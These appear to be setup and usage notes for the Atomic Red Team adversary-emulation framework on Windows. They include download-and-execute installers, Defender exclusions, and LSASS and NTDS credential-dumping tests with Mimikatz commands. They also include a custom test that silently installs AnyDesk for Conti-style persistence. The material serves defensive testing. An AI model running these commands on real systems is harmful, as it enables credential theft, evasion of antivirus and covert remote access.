# Installation

## Install Execution framework

```powershell
IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing);
Install-AtomicRedTeam -InstallPath C:\AtomicRedTeam
```

## Import execution framework powershell profile

```powershell
Import-Module "C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1" -Force
```

## Defender exclusions

```powershell
Add-MpPreference -ExclusionPath "C:\AtomicRedTeam\atomics"
Add-MpPreference -ExclusionPath "C:\AtomicRedTeam\tmp"
```

## Install atomics

```powershell
IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicsfolder.ps1' -UseBasicParsing);
Install-AtomicsFolder -InstallPath "C:\AtomicRedTeam" -RepoOwner "redcanaryco" -Branch "master"
```


## Test details

```powershell
Invoke-AtomicTest T1003 -ShowDetails
```

## Run test

```powershell
Invoke-AtomicTest T1053.005 -TestNumbers 1
```

## Run cleanup

```powershell
Invoke-AtomicTest T1053.005 -TestNumbers 1 -Cleanup
```

# OS Credential Dumping: LSASS Memory 

T1003.001 Atomic Test #2 

```powershell
Invoke-AtomicTest T1003.001 -TestNumbers 2
Invoke-AtomicTest T1003.001 -TestNumbers 2 -CheckPrereqs
Invoke-AtomicTest T1003.001 -TestNumbers 2 -GetPrereqs
# Disable Defender Realtime-protection otherwise procdump will hang :/
Invoke-AtomicTest T1003.001 -TestNumbers 2
# Mimikatz check
sekurlsa::minidump C:\Windows\Temp\lsass_dump.dmp
sekurlsa::logonPasswords full
```

Note:

In case you encounter error `ERROR kuhl_m_sekurlsa_acquireLSA ; Key import` you must use older build of Mimikatz or update the VM and retry the dump. Mimikatz usually tries to keep everything working only on latest systems.
https://github.com/gentilkiwi/mimikatz/issues/248

# Windows Management Instrumentation

T1047 Atomic Test #6

```powershell
Invoke-AtomicTest T1047 -TestNumbers 6 -InputArgs @{ "node" = "192.168.40.129"; "user_name" = "IEUser";  "password" = "Passw0rd!"; "process_to_execute" = """cmd /c vssadmin.exe list shadows >> c:\log.txt""" }
```

If you don't have remote machine you can test similar technique locally using Atomic Test #5

```powershell
Invoke-AtomicTest T1047 -TestNumbers 5 -InputArgs @{ "process_to_execute" = """cmd /c vssadmin.exe list shadows >> c:\log.txt""" }
```

# OS Credential Dumping: NTDS

T1003.003 Atomic Test #1 and #2

```powershell
Invoke-AtomicTest T1003.003 -TestNumbers 1,2 -CheckPrereq
Invoke-AtomicTest T1003.003 -TestNumbers 1,2
```

# Remote Access Software

T1219 Atomic Test #2

```powershell
Invoke-AtomicTest T1219 -TestNumbers 2
```

New test:
```yaml
- name: AnyDesk Silent Installation Test on Windows
  description: |
    An adversary may attempt to silently install AnyDesk and use it to establish persistence. This technique was observed in the leaked "manuals" used by operators of Conti ransomware. Download of AnyDesk installer will be at the destination location and ran with --install, --start-with-win and --slilent parameters.
  supported_platforms:
  - windows
  executor:
    command: |
      Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\AnyDesk.exe https://download.anydesk.com/AnyDesk.exe
      $file1 = "C:\Users\" + $env:username + "\Desktop\AnyDesk.exe"
      Start-Process $file1 -ArgumentList "--silent", "--install", "C:\ProgramData\AnyDesk", "--start-with-win";
    cleanup_command: |-
      Start-Process "C:\ProgramData\AnyDesk\AnyDesk.exe" -ArgumentList "--remove", "--silent";
      $file1 = "C:\Users\" + $env:username + "\Desktop\AnyDesk.exe"
      Remove-Item $file1 -ErrorAction Ignore
    name: powershell
    elevation_required: true
```

```
Invoke-AtomicTest T1219 -ShowDetails
Invoke-AtomicTest T1219 -TestNumbers 6
```